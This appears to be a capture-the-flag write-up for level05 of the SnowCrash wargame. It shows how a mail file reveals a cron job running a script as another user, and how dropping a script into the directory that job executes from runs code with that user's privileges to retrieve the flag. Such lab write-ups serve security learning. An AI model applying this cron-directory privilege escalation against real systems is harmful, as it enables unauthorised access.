### Chron task

-> We receive at the beggining that we have a mail.

if we `find / -name 'mail' 2>/dev/null`

we can see 
```level05@SnowCrash:/rofs/usr/sbin$ find / -name 'mail' 2>/dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
```

if we cat `/var/mail/level05`
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

Chron launch openarenaserver script every two minutes.

We see that it is executed with `su`.

if we cat
```
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

```

We can write a script that make get_flag function and redirect the output in a repository that we have the right to write inside.
And then cat the token.

write a script with this command in /opt/openarenaserver/
`getflag > /var/crash/test.txt`

At max two minutes after you can see the flag.